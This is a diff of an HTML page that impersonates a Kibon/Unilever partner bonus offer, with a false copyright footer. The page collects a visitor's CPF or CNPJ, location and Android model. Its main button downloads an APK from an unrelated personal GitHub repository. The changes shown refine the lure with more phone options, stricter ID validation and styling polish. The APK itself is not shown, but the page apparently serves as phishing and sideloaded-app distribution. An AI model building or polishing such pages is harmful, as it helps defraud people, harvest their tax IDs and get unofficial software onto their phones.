@@ -12,7 +12,7 @@
         }
 
         body { 
-            font-family: Arial, sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             margin: 0; padding: 0; 
             background-color: var(--cinza-fundo); 
             display: flex; flex-direction: column; align-items: center;
@@ -25,6 +25,7 @@
             border-radius: 40px; 
             box-shadow: 0 10px 30px rgba(0,0,0,0.05);
             margin-top: 50px;
+            margin-bottom: 30px;
         }
 
         .header-bonus { 
@@ -44,7 +45,7 @@
             font-weight: bold; 
             margin-bottom: 8px; 
             color: #444; 
-            font-size: 13px;
+            font-size: 12px;
             text-transform: uppercase;
         }
 
@@ -58,7 +59,10 @@
             font-size: 16px; 
             box-sizing: border-box;
             background-color: #fff;
+            outline: none;
         }
+
+        input:focus, select:focus { border-color: var(--vermelho-kibon); }
 
         .row { display: flex; gap: 15px; }
         .row div { flex: 1; }
@@ -74,11 +78,14 @@
             font-weight: bold; font-size: 18px;
             margin-top: 20px;
             box-shadow: 0 8px 15px rgba(227, 27, 35, 0.3);
+            transition: transform 0.2s;
         }
+
+        .btn-resgatar:active { transform: scale(0.98); }
 
         .error-msg { color: var(--vermelho-kibon); font-size: 12px; font-weight: bold; display: none; margin-top: 5px; }
 
-        footer { margin-top: 40px; color: #bbb; font-size: 11px; text-align: center; }
+        footer { margin-bottom: 40px; color: #bbb; font-size: 11px; text-align: center; width: 100%; }
     </style>
 </head>
 <body>
@@ -89,20 +96,21 @@
         <p>EXCLUSIVO PARA PARCEIROS</p>
     </div>
 
-    <form>
+    <form id="kibonForm">
         <div class="form-group">
             <label>Perfil Profissional</label>
             <select required>
                 <option value="">Selecione seu perfil...</option>
                 <option>Ponto de Venda (PDV)</option>
-                <option>Revendedor</option>
+                <option>Dono de Estabelecimento</option>
+                <option>Revendedor Autorizado</option>
             </select>
         </div>
 
         <div class="form-group">
             <label>CPF ou CNPJ (Apenas números)</label>
-            <input type="text" id="doc" placeholder="Digite aqui..." maxlength="14">
-            <span id="docErro" class="error-msg">Documento Inválido!</span>
+            <input type="text" id="doc" placeholder="Digite aqui..." maxlength="18" required>
+            <span id="docErro" class="error-msg">⚠️ Documento inválido! Digite um CPF ou CNPJ válido.</span>
         </div>
 
         <div class="row form-group">
@@ -115,7 +123,7 @@
             <div style="flex: 2;">
                 <label>Cidade</label>
                 <select id="cidade" required disabled>
-                    <option value="">Selecione...</option>
+                    <option value="">Selecione o estado...</option>
                 </select>
             </div>
         </div>
@@ -124,13 +132,22 @@
             <label>Modelo do seu Android</label>
             <select required>
                 <option value="">Selecione o aparelho...</option>
-                <option>Samsung Galaxy S / A / M</option>
-                <option>Motorola Moto G / Edge</option>
-                <option>Xiaomi Redmi / POCO</option>
+                <optgroup label="Samsung">
+                    <option>Galaxy S24 / S23 / S22 / S21 / S20</option>
+                    <option>Galaxy A (A14, A34, A54, etc)</option>
+                    <option>Galaxy M / Note / Z Flip</option>
+                </optgroup>
+                <optgroup label="Motorola">
+                    <option>Moto G (G84, G54, G23, etc)</option>
+                    <option>Moto Edge / Moto E</option>
+                </optgroup>
+                <optgroup label="Xiaomi">
+                    <option>Redmi Note / POCO / Xiaomi Mi</option>
+                </optgroup>
             </select>
         </div>
 
-        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-resgatar">
+        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-resgatar" id="btnDownload">
             BAIXAR APK E RESGATAR
         </a>
     </form>
@@ -139,48 +156,63 @@
 <footer>© 2026 KIBON BRASIL - UNILEVER. TODOS OS DIREITOS RESERVADOS.</footer>
 
 <script>
-    // --- Lógica para Estados e Cidades (API IBGE) ---
-    const estSelect = document.getElementById('estado');
-    const cidSelect = document.getElementById('cidade');
+    const estadoSelect = document.getElementById('estado');
+    const cidadeSelect = document.getElementById('cidade');
 
-    // Carregar Estados
-    fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados?orderBy=nome')
-        .then(r => r.json())
-        .then(dados => {
-            dados.forEach(uf => {
-                let opt = document.createElement('option');
-                opt.value = uf.sigla;
-                opt.text = uf.sigla; // Mostra a sigla (SP, RJ, etc) como no seu print
-                estSelect.add(opt);
-            });
-        });
+    // Lista de todos os Estados do Brasil
+    const estados = [
+        {sigla: 'AC', nome: 'Acre'}, {sigla: 'AL', nome: 'Alagoas'}, {sigla: 'AP', nome: 'Amapá'},
+        {sigla: 'AM', nome: 'Amazonas'}, {sigla: 'BA', nome: 'Bahia'}, {sigla: 'CE', nome: 'Ceará'},
+        {sigla: 'DF', nome: 'Distrito Federal'}, {sigla: 'ES', nome: 'Espírito Santo'}, {sigla: 'GO', nome: 'Goiás'},
+        {sigla: 'MA', nome: 'Maranhão'}, {sigla: 'MT', nome: 'Mato Grosso'}, {sigla: 'MS', nome: 'Mato Grosso do Sul'},
+        {sigla: 'MG', nome: 'Minas Gerais'}, {sigla: 'PA', nome: 'Pará'}, {sigla: 'PB', nome: 'Paraíba'},
+        {sigla: 'PR', nome: 'Paraná'}, {sigla: 'PE', nome: 'Pernambuco'}, {sigla: 'PI', nome: 'Piauí'},
+        {sigla: 'RJ', nome: 'Rio de Janeiro'}, {sigla: 'RN', nome: 'Rio Grande do Norte'}, {sigla: 'RS', nome: 'Rio Grande do Sul'},
+        {sigla: 'RO', nome: 'Rondônia'}, {sigla: 'RR', nome: 'Roraima'}, {sigla: 'SC', nome: 'Santa Catarina'},
+        {sigla: 'SP', nome: 'São Paulo'}, {sigla: 'SE', nome: 'Sergipe'}, {sigla: 'TO', nome: 'Tocantins'}
+    ];
 
-    // Carregar Cidades quando mudar o Estado
-    estSelect.addEventListener('change', () => {
-        cidSelect.innerHTML = '<option value="">Carregando...</option>';
-        cidSelect.disabled = true;
-        
-        fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${estSelect.value}/municipios`)
-            .then(r => r.json())
-            .then(dados => {
-                cidSelect.innerHTML = '<option value="">Selecione...</option>';
-                dados.forEach(cid => {
-                    let opt = document.createElement('option');
-                    opt.value = cid.nome;
-                    opt.text = cid.nome;
-                    cidSelect.add(opt);
-                });
-                cidSelect.disabled = false;
-            });
+    // Popula estados
+    estados.forEach(uf => {
+        let opt = document.createElement('option');
+        opt.value = uf.sigla;
+        opt.text = uf.sigla;
+        estadoSelect.add(opt);
     });
 
-    // --- Validação simples de CPF/CNPJ ---
+    // Função que busca TODAS as cidades do estado selecionado via API do IBGE (Método mais rápido e completo)
+    estadoSelect.addEventListener('change', function() {
+        const uf = this.value;
+        cidadeSelect.innerHTML = '<option value="">Carregando cidades...</option>';
+        cidadeSelect.disabled = true;
+
+        if (uf !== "") {
+            fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${uf}/municipios?orderBy=nome`)
+                .then(response => response.json())
+                .then(cidades => {
+                    cidadeSelect.innerHTML = '<option value="">Selecione a cidade...</option>';
+                    cidades.forEach(cidade => {
+                        let opt = document.createElement('option');
+                        opt.value = cidade.nome;
+                        opt.text = cidade.nome;
+                        cidadeSelect.add(opt);
+                    });
+                    cidadeSelect.disabled = false;
+                });
+        } else {
+            cidadeSelect.innerHTML = '<option value="">Selecione o estado...</option>';
+            cidadeSelect.disabled = true;
+        }
+    });
+
+    // Validação de Documento (CPF/CNPJ)
     document.getElementById('doc').addEventListener('blur', function() {
         const v = this.value.replace(/\D/g, '');
         const erro = document.getElementById('docErro');
+        // Validação real de tamanho: CPF(11) ou CNPJ(14)
         if (v.length !== 11 && v.length !== 14) {
             erro.style.display = 'block';
-            this.style.borderColor = '#e31b23';
+            this.style.borderColor = 'var(--vermelho-kibon)';
         } else {
             erro.style.display = 'none';
             this.style.borderColor = '#ddd';
